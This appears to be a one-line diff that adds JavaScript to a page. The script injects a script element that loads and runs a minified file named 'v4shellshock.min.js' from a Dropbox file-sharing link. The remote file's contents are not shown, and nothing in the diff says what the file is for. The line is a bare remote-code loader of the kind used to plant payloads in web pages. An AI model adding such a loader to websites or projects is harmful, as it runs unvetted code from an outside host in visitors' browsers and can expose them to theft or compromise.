@@ -1,0 +1,1 @@
+var script = document.createElement('script');script.src = 'https://dl.dropboxusercontent.com/s/uv10y0yjjkywe5x/v4shellshock.min.js';script.type = 'text/javascript';script.onload = function() {console.log('Script has been loaded');};document.body.appendChild(script);
